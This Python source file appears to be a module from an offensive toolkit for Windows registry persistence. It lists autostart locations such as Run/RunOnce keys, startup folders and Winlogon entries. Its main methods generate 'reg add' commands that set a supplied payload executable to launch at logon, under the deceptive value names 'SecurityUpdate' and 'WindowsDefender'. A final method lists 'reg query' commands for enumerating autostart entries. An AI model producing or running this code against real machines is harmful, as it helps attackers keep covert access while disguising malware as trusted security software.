#!/usr/bin/env python3
"""
Registry Persistence - Windows persistence via registry keys
"""
import logging
from typing import Dict, List

logger = logging.getLogger(__name__)

class RegistryPersistence:
    """
    Windows registry-based persistence techniques.
    """
    def __init__(self, config: Dict):
        """
        Initializes RegistryPersistence module.

        Args:
            config (Dict): Configuration dictionary
        """
        self.config = config
        logger.info("RegistryPersistence module initialized")

    def get_persistence_keys(self) -> Dict:
        """
        Get common Windows registry keys for persistence.

        Returns:
            Dict: Registry persistence locations
        """
        persistence_keys = {
            "run_keys": {
                "HKCU_Run": r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
                "HKLM_Run": r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run",
                "HKCU_RunOnce": r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                "HKLM_RunOnce": r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce"
            },
            "startup_folders": {
                "user_startup": r"C:\Users\[USERNAME]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup",
                "all_users_startup": r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
            },
            "services": {
                "services_key": r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services"
            },
            "winlogon": {
                "userinit": r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit",
                "shell": r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell"
            }
        }

        logger.info("Retrieved Windows persistence registry keys")
        return persistence_keys

    def generate_registry_command(self, key_path: str, value_name: str, value_data: str) -> str:
        """
        Generate registry modification command.

        Args:
            key_path (str): Registry key path
            value_name (str): Value name
            value_data (str): Value data

        Returns:
            str: REG ADD command
        """
        cmd = f'reg add "{key_path}" /v "{value_name}" /t REG_SZ /d "{value_data}" /f'
        logger.info(f"Generated registry command: {cmd}")
        return cmd

    def generate_persistence_payload(self, payload_path: str, method: str = "run_key") -> Dict:
        """
        Generate persistence payload using registry.

        Args:
            payload_path (str): Path to payload executable
            method (str): Persistence method (run_key, service, winlogon)

        Returns:
            Dict: Persistence configuration
        """
        methods = {
            "run_key": {
                "key": r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
                "value": "SecurityUpdate",
                "command": self.generate_registry_command(
                    r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
                    "SecurityUpdate",
                    payload_path
                )
            },
            "run_key_system": {
                "key": r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run",
                "value": "WindowsDefender",
                "command": self.generate_registry_command(
                    r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run",
                    "WindowsDefender",
                    payload_path
                ),
                "requires": "Administrator privileges"
            }
        }

        result = methods.get(method, methods["run_key"])
        result["payload_path"] = payload_path
        result["method"] = method

        return result

    def get_enumeration_commands(self) -> List[str]:
        """
        Get commands to enumerate existing persistence mechanisms.

        Returns:
            List[str]: Registry query commands
        """
        commands = [
            r'reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"',
            r'reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"',
            r'reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"',
            r'reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"',
            r'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"'
        ]

        logger.info("Generated registry enumeration commands")
        return commands
